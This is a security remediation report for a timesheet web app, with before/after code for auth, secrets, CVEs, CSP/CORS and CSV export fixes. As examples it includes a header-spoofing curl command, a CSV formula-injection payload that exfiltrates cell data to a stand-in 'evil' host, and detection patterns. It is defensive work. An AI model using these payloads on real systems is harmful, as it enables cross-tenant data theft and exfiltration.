# Security Remediation

Remediation pass over `timesheet-app` covering dependency CVEs, committed secrets, and code-level
vulnerabilities, with before/after evidence for each change.

- **Date:** 2026-09-22
- **Scope:** `backend/`, `frontend/`, `docker/`, `.github/workflows/`
- **Toolchain:** Trivy 0.74.0, `npm audit` (npm 11.12.1, Node v24.15.0)

## Scan results

| Scanner | Target | Before | After |
| --- | --- | --- | --- |
| `npm audit` | `backend/` | 23 total — **1 critical, 13 high**, 6 moderate, 3 low | **0** |
| `npm audit` | `frontend/` | 20 total — **14 high**, 5 moderate, 1 low | **0** |
| Trivy `vuln` | repo (HIGH+CRITICAL) | 37 findings | **0** |
| Trivy `secret` | repo | 5 findings (2 critical AWS, 1 critical GitHub PAT, 1 critical Stripe, 1 high Slack) | **0** |
| Trivy `misconfig` | `docker/Dockerfile` | 0 | **0** |
| Backend test suite | `backend/` | 167 passing | **182 passing** (+15, including 12 new security regression tests) |

Commands used:

```bash
# Dependency scanning
cd backend  && npm audit
cd frontend && npm audit

# Trivy (DOCKER_CONFIG avoids the docker-credential-desktop helper lookup)
DOCKER_CONFIG=/tmp/empty trivy fs --scanners vuln,secret,misconfig \
  --severity HIGH,CRITICAL --skip-dirs node_modules .
DOCKER_CONFIG=/tmp/empty trivy config docker/Dockerfile
```

---

## 1. CRITICAL — Authentication was a client-supplied header

`authenticateUser` trusted the `x-user-email` request header and auto-provisioned any unknown
address. Every `user_email = ?` predicate in the codebase was therefore scoping on an
attacker-controlled value: `curl -H 'x-user-email: ceo@corp.com' /api/clients` returned that
tenant's data. `POST /api/auth/login` issued no credential at all, and `jsonwebtoken` was a
dependency that no code used.

**Before** — `backend/src/middleware/auth.js`

```js
function authenticateUser(req, res, next) {
  const userEmail = req.headers['x-user-email'];
  if (!userEmail) {
    return res.status(401).json({ error: 'User email required in x-user-email header' });
  }
  // ...email regex check...
  db.get('SELECT email FROM users WHERE email = ?', [userEmail], (err, row) => {
    if (!row) {
      // Create new user
      db.run('INSERT INTO users (email) VALUES (?)', [userEmail], (err) => {
        req.userEmail = userEmail;   // identity asserted by the caller
        next();
      });
    } else {
      req.userEmail = userEmail;
      next();
    }
  });
}
```

**After** — `backend/src/middleware/auth.js`

```js
function authenticateUser(req, res, next) {
  const authHeader = req.headers.authorization || '';
  const [scheme, token] = authHeader.split(' ');

  if (!token || scheme.toLowerCase() !== 'bearer') {
    return res.status(401).json({ error: 'Authentication required' });
  }

  let payload;
  try {
    // Pinning the algorithm prevents algorithm-confusion attacks (e.g. alg: none).
    payload = jwt.verify(token, getJwtSecret(), { algorithms: [jwtAlgorithm] });
  } catch (err) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }

  if (!payload || typeof payload.sub !== 'string' || !payload.sub) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }

  req.userEmail = payload.sub;   // identity comes from the signed token only
  next();
}
```

Supporting changes:

- `backend/src/routes/auth.js` — `POST /api/auth/register` and `POST /api/auth/login` verify a
  bcrypt-hashed password (cost 12) and return a signed HS256 JWT. No user is ever created on login.
- `backend/src/config/auth.js` (new) — reads `JWT_SECRET` from the environment, requires ≥32
  characters, and `assertAuthConfig()` is called from `startServer()` so a misconfigured deployment
  refuses to boot instead of serving broken auth.
- `backend/src/database/init.js`, `docker/overrides/database/init.js` — `users` gains
  `password_hash TEXT NOT NULL`.
- `backend/src/validation/schemas.js` — `credentialsSchema` requires a 12–128 character password and
  lower-cases the email so the primary key cannot be duplicated by changing capitalisation.
- `frontend/src/api/client.ts` — sends `Authorization: Bearer <token>` instead of `x-user-email`.
- `frontend/src/contexts/AuthContext.tsx`, `frontend/src/pages/LoginPage.tsx` — password field plus a
  register/login toggle; the login screen no longer advertises that there is no password.

> **Migration:** `password_hash` is `NOT NULL`, so a file-backed database from a previous version must
> be re-initialised and every user must register again — no passwords existed before this change.

---

## 2. CRITICAL — Credentials committed to the repository

Trivy's secret scanner flagged five credentials in the deploy workflow.

**Before** — `.github/workflows/deploy.yml`

```yaml
      - name: Configure AWS
        env:
          AWS_ACCESS_KEY_ID: AKIA<20-char key committed in plaintext — REDACTED>
          AWS_SECRET_ACCESS_KEY: <40-char secret committed in plaintext — REDACTED>
          AWS_DEFAULT_REGION: us-east-1
      # ...plus SLACK_BOT_TOKEN (xoxb-...), GITHUB_PAT (ghp_...) and a Stripe sk_live_ key inline
```

> Credential values are redacted in this document on purpose: they are compromised (see
> [Manual follow-ups](#manual-follow-ups)) and reproducing them here would re-commit them and trip
> secret scanning. `git log -p .github/workflows/deploy.yml` has the originals.

**After**

```yaml
      - name: Configure AWS
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          AWS_DEFAULT_REGION: ${{ vars.AWS_DEFAULT_REGION }}
```

`backend/src/config/production.js` held a JWT signing secret, a Postgres URL with an inline password,
and a SendGrid API key. **Trivy did not detect these** — the values do not match its length-anchored
patterns (the planted SendGrid key is `SG.<17>.<42>` where the rule requires `SG.<22>.<43>`). Verified
by scanning a real-format key, which Trivy reports as MEDIUM. This is a concrete argument for adding
gitleaks alongside Trivy rather than relying on one secret scanner.

**Before** — `backend/src/config/production.js`

```js
module.exports = {
  jwt: {
    // hardcoded signing secret (should be moved to env/secret manager)
    secret: '<44-char signing secret — REDACTED>',
    expiresIn: '24h',
  },
  database: {
    url: 'postgres://tsapp_admin:<password — REDACTED>@db.internal.timesheet.io:5432/timesheet',
  },
  sendgrid: {
    apiKey: 'SG.<redacted>.<redacted>',
  },
};
```

**After**

```js
function required(name) {
  const value = process.env[name];
  if (!value) {
    throw new Error(`Missing required environment variable: ${name}`);
  }
  return value;
}

module.exports = {
  jwt: {
    get secret() { return required('JWT_SECRET'); },
    expiresIn: process.env.JWT_EXPIRES_IN || '24h',
  },
  database: { get url() { return required('DATABASE_URL'); } },
  sendgrid: { get apiKey() { return required('SENDGRID_API_KEY'); } },
};
```

> **Not remediated by this change — requires manual action.** These values were treated as
> potentially live. Removing them from the working tree does **not** revoke them and does **not**
> remove them from git history. See [Manual follow-ups](#manual-follow-ups).

---

## 3. CRITICAL/HIGH — Dependency CVEs

**Before** — `backend/`: 1 critical + 13 high. The critical was `tar` reachable through
`sqlite3 → node-gyp → make-fetch-happen → cacache → tar` (arbitrary file write via hardlink path
traversal). `npm audit fix` cleared 16 findings; the remaining 7 needed the breaking
`sqlite3@5 → 6` bump, which drops the `node-gyp` chain entirely.

Also fixed in passing: `jws@3.2.2` (CVE-2025-65945, *improperly verifies HMAC signature*) — directly
relevant since this change introduces JWT verification.

| Package | Before | After |
| --- | --- | --- |
| `sqlite3` | 5.1.7 | **6.0.1** (breaking, declared in `package.json`) |
| `tar` (transitive) | 6.2.1 | **7.5.22** |
| `jws` (transitive) | 3.2.2 | **3.2.3** |
| `express` | 4.x (vulnerable `qs`, `path-to-regexp`) | **4.22.3** |
| `path-to-regexp` | 0.1.12 | **0.1.13** |
| `axios` | 1.13.2 | **1.20.0** |
| `vite` | 7.2.4 | **7.3.6** |
| `react-router-dom` / `react-router` | 7.10.0 | **7.18.4** |
| `postcss` | ≤8.5.22 | **8.5.28** |
| `nanoid` | ≤3.3.17 | **3.3.19** |
| `bcryptjs` | — | **3.0.3** (added) |

Every selected version was published more than 7 days before this change, per the repo's
dependency-age rule. `frontend/package.json` needed no edit — all fixes fell inside existing semver
ranges, so only `package-lock.json` changed.

---

## 4. HIGH — CSV formula injection in report exports (CWE-1236)

Work-entry descriptions were written verbatim by `csv-writer`. The Joi schema permits any 1000-character
string, so a stored description like `=HYPERLINK("http://evil/?"&A1,"click")` executed when a colleague
opened the exported report in Excel or Google Sheets.

**Before** — `backend/src/routes/reports.js`

```js
          csvWriter.writeRecords(workEntries)
            .then(() => { /* res.download(...) */ });
```

**After**

```js
// Spreadsheet applications treat a cell beginning with =, +, -, @, tab or CR as a formula.
// Stored values such as `=HYPERLINK("http://evil/?"&A1)` would execute when the exported
// report is opened, so neutralise them by prefixing with a single quote (CWE-1236).
const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/;

function escapeCsvInjection(value) {
  if (typeof value !== 'string') {
    return value;
  }
  return CSV_FORMULA_PREFIX.test(value) ? `'${value}` : value;
}

// ...
          csvWriter.writeRecords(sanitizeCsvRecords(workEntries))
```

Verified end-to-end against a running server — the exported cell is now inert:

```
Date,Hours,Description,Created At
2026-09-20,3,"'=HYPERLINK(""http://evil.example/?""&A1,""click"")",2026-09-22 11:40:33
```

---

## 5. HIGH — Production CSP allowed inline scripts; CORS reflected any origin

The container build shipped a *weaker* configuration than the dev server: `scriptSrc` allowed
`'unsafe-inline'` and `useDefaults: false` dropped helmet's `object-src`, `base-uri` and
`form-action` defaults, so any injected script would have executed. CORS reflected arbitrary origins
with `credentials: true`.

**Before** — `docker/overrides/server.js`

```js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      // ...
    },
    useDefaults: false,
  },
  crossOriginResourcePolicy: { policy: "cross-origin" },
  crossOriginOpenerPolicy: { policy: "unsafe-none" },
  strictTransportSecurity: false,
}));

app.use(cors({
  origin: process.env.NODE_ENV === 'production' ? true : (process.env.FRONTEND_URL || 'http://localhost:5173'),
  credentials: true
}));
```

**After**

```js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      // ...
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
    },
    useDefaults: true,
  },
  crossOriginResourcePolicy: { policy: "same-origin" },
  crossOriginOpenerPolicy: { policy: "same-origin" },
  strictTransportSecurity: process.env.ENABLE_HSTS === 'true'
    ? { maxAge: 31536000, includeSubDomains: true }
    : false,
}));

const allowedOrigins = (process.env.ALLOWED_ORIGINS || process.env.FRONTEND_URL || '')
  .split(',').map((origin) => origin.trim()).filter(Boolean);

app.use(cors({
  origin: allowedOrigins.length > 0
    ? allowedOrigins
    : (process.env.NODE_ENV === 'production' ? false : 'http://localhost:5173'),
  credentials: true
}));
```

`styleSrc` keeps `'unsafe-inline'` because Emotion/MUI inject `<style>` tags at runtime; removing it
requires nonce plumbing through the SPA build and is tracked as a follow-up. HSTS is now opt-in via
`ENABLE_HSTS` so it is only sent once TLS is actually terminated.

---

## 6. MEDIUM — Login enumerated registered accounts

An existing email returned `200 {"message":"Login successful"}` while an unknown one returned
`201 {"message":"User created and logged in successfully"}` — both status and body revealed whether an
address was registered.

**Before** — `backend/src/routes/auth.js`

```js
    db.get('SELECT email, created_at FROM users WHERE email = ?', [email], (err, row) => {
      if (row) {
        return res.json({ message: 'Login successful', user: { /* ... */ } });
      } else {
        db.run('INSERT INTO users (email) VALUES (?)', [email], function(err) {
          res.status(201).json({ message: 'User created and logged in successfully', /* ... */ });
        });
      }
    });
```

**After**

```js
    const user = await dbGet(db,
      'SELECT email, password_hash, created_at FROM users WHERE email = ?', [email]);

    // Always run a comparison, then use a single generic failure message for both an unknown
    // email and a wrong password so the endpoint cannot be used to enumerate accounts.
    const passwordMatches = await bcrypt.compare(password, user ? user.password_hash : getDummyHash());

    if (!user || !passwordMatches) {
      return res.status(401).json({ error: INVALID_CREDENTIALS });
    }
```

A bcrypt comparison always runs — against a dummy hash when the email is unknown — so response
timing does not distinguish the two cases either. Credential endpoints also gained a dedicated
limiter (10 attempts / 15 min, successful requests skipped) in both `backend/src/server.js` and
`docker/overrides/server.js`, on top of the existing global 100/15 min.

Verified live:

```
$ curl -X POST .../api/auth/login -d '{"email":"alice@example.com","password":"wrong-password-here"}'
{"error":"Invalid email or password"} status=401
$ curl -X POST .../api/auth/login -d '{"email":"nobody@example.com","password":"wrong-password-here"}'
{"error":"Invalid email or password"} status=401
```

---

## 7. MEDIUM — Error handler leaked internal messages

The fallback branch echoed `err.message` verbatim, so any error raised by `pdfkit`, `csv-writer` or
`fs` returned absolute paths and library internals to the client.

**Before** — `backend/src/middleware/errorHandler.js`

```js
  // Default error
  res.status(err.status || 500).json({
    error: err.message || 'Internal server error'
  });
```

**After**

```js
  const status = err.status || 500;

  // Deliberate client errors (4xx) carry a safe, intentional message. Anything 5xx is an
  // unexpected failure whose message may contain file paths or library internals, so it is
  // logged above and replaced with a generic response.
  if (status >= 400 && status < 500 && err.message) {
    return res.status(status).json({ error: err.message });
  }

  res.status(status).json({ error: 'Internal server error' });
```

---

## 8. LOW — Post-write re-reads not scoped by `user_email`

Four "return the row we just wrote" queries selected by `id` alone. Not exploitable (ownership was
verified in the enclosing callback) but a violation of the repo rule in `AGENTS.md` and
`.devin/rules/sql-safety.md`, and a finding `/security-audit` reported on every run. Closes BUGS.md #5.

**Before** — `backend/src/routes/clients.js` (and three equivalents)

```js
          'SELECT id, name, ... FROM clients WHERE id = ?',
          [this.lastID],
```

**After**

```js
          'SELECT id, name, ... FROM clients WHERE id = ? AND user_email = ?',
          [this.lastID, req.userEmail],
```

---

## Confirmed clean (no change required)

- **SQL injection** — every query in `backend/src/routes/` uses `?` placeholders. The two dynamic
  query builders concatenate only hardcoded column-name fragments; values always go through the
  params array. No string interpolation of request data into SQL anywhere.
- **XSS** — no `dangerouslySetInnerHTML`, `innerHTML`, `eval`, or `new Function` anywhere in
  `frontend/src`. All rendering goes through JSX/MUI, which escapes by default.
- **Dockerfile** — `trivy config` reports 0 misconfigurations. Multi-stage build, non-root `nodejs`
  user, `dumb-init`, healthcheck.
- **Path traversal / header injection in exports** — export filenames are sanitised with
  `[^a-zA-Z0-9] → _` before use in `path.join` and `Content-Disposition`.

---

## Verification

```
backend:  npm audit          → found 0 vulnerabilities
frontend: npm audit          → found 0 vulnerabilities
trivy fs --scanners vuln,secret,misconfig --severity HIGH,CRITICAL
                             → 0 vulns, 0 secrets, 0 misconfigs
backend:  npm test           → 8 suites, 182 tests passing
frontend: npm run lint       → clean
frontend: npm run build      → success
```

New security regression tests (12):

| Test | Asserts |
| --- | --- |
| `middleware/auth.test.js` — "should reject a request that only sets x-user-email" | the fixed vulnerability stays fixed |
| `middleware/auth.test.js` — "should ignore x-user-email when a valid token is present" | the header cannot override token identity |
| `middleware/auth.test.js` — wrong secret / `alg: none` / expired / garbage / no `sub` | token forgery is rejected |
| `routes/auth.test.js` — "should store a bcrypt hash and never the plaintext password" | passwords are not stored in the clear |
| `routes/auth.test.js` — "should return an identical response for an unknown email and a wrong password" | no account enumeration |
| `routes/auth.test.js` — "should never create a user as a side effect of logging in" | no implicit provisioning |
| `routes/reports.test.js` — 6 formula-injection cases + 2 negative cases | CSV cells are neutralised, ordinary text untouched |
| `middleware/errorHandler.test.js` — "should not leak internal error messages on 5xx responses" | no internal detail in 5xx bodies |

Live end-to-end checks against a running server confirmed: header spoofing returns 401; two tenants
cannot see each other's clients (`{"clients":[]}` / 404); a formula-injection description is escaped
in the exported CSV; and the server refuses to start without a valid `JWT_SECRET`.

---

## Manual follow-ups

Items that code changes cannot close:

1. **Rotate the exposed credentials.** The AWS key pair, Slack bot token, GitHub PAT, Stripe
   `sk_live_` key, JWT secret, Postgres password and SendGrid key were committed in plaintext and must
   be considered compromised. Revoke and reissue them at each provider, then populate the GitHub
   Actions secrets (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `SLACK_BOT_TOKEN`,
   `RELEASE_TAG_PAT`, `STRIPE_SECRET_KEY`) and the `AWS_DEFAULT_REGION` variable.
2. **Scrub git history.** The secrets remain in earlier commits. Requires a history rewrite
   (`git filter-repo`) plus a force-push — not performed here, as it is destructive and needs
   coordination with everyone holding a clone.
3. **Enable GitHub secret scanning + push protection** so this cannot recur, and add **gitleaks** to
   CI alongside Trivy (see §2 for why one scanner is not enough).
4. **Re-initialise any file-backed database** — `password_hash` is `NOT NULL` and no passwords
   existed before; all users must register again.
5. **Set `JWT_SECRET` in every deployment** (`openssl rand -base64 48`). The server now refuses to
   start without it, including the container — `docker/Dockerfile` intentionally ships no default.

## Known residual risks

Accepted or deferred, documented rather than silently dropped:

- **Token stored in `localStorage`** — readable by any successful XSS. An `httpOnly` cookie would be
  stronger but requires CSRF protection across every mutating endpoint; deferred as a separate change.
  The tightened CSP (§5) is the compensating control.
- **Registration still enumerates** — `POST /api/auth/register` returns 409 for an address that is
  already taken. Closing this properly needs an email-verification flow.
- **`styleSrc: 'unsafe-inline'`** retained for Emotion/MUI; needs nonce plumbing to remove.
- **No pagination** — `GET /api/work-entries` and the report/export endpoints return and buffer
  unbounded result sets; the rate limiter is the only brake.
- **Predictable CSV temp file** — `backend/temp/<client>_report_<timestamp>.csv` is written then
  unlinked; a crash mid-request leaves plaintext client data on disk. `fs.mkdtemp`, or streaming the
  CSV as the PDF route already does, would fix it.
- **CI gaps, unchanged by this pass** — the `security-audit` and `test-coverage` jobs skip PRs whose
  author contains `devin`; `frontend/` has no `test:coverage` script so that gate always fails into a
  misleading comment; `backend && npm test` never runs in CI; and `sonar-project.properties` declares
  `client-timesheet-app` while `sast-scan.yml` links to `Cognition-Partner-Workshops_app_timesheet`.
